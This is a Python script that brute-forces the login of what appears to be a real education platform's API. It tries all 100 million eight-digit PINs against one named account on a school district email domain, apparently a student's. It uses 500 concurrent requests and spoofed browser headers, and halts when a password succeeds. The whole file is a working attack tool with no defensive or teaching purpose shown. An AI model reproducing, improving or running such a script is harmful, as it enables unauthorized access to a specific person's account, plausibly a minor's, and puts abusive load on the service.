import asyncio
import aiohttp
from itertools import product
from tqdm import tqdm
import os

USERNAME = "torres.a6@stu.janesville.k12.wi.us"
URL = "https://my-api.mheducation.com/api/login"
TOTAL = 100_000_000
FOUND = False

async def attack(sem, session, pin, pbar):
    global FOUND
    if FOUND: return
    async with sem:
        try:
            async with session.post(URL, json={"username": USERNAME, "password": pin}) as r:
                if r.status == 200:
                    print(f"\n\n{'='*60}\n🎯 PASSWORD FOUND: {pin} 🎯\n{'='*60}")
                    FOUND = True
                    pbar.close()
                    os._exit(0)
        except:
            pass
        finally:
            pbar.update(1)

async def main():
    global FOUND
    sem = asyncio.Semaphore(500)                  # 500 concurrent = nuclear
    connector = aiohttp.TCPConnector(limit=1000, force_close=True)
    timeout = aiohttp.ClientTimeout(total=8)

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/json",
        "Origin": "https://login.mheducation.com",
        "Referer": "https://login.mheducation.com/",
        "Connection": "keep-alive"
    }

    async with aiohttp.ClientSession(headers=headers, connector=connector, timeout=timeout) as session:
        pbar = tqdm(total=TOTAL, desc="BRUTAL SPEED", unit="pin", colour="cyan", dynamic_ncols=True)
        tasks = []

        for combo in product("0123456789", repeat=8):
            if FOUND: break
            pin = "".join(combo)
            tasks.append(asyncio.create_task(attack(sem, session, pin, pbar)))

            if len(tasks) >= 20000:                 # massive batch, zero overhead
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        pbar.close()

print("🚀 FULL SEND ACTIVATED — NO LIMITS 🚀")
asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
asyncio.run(main())
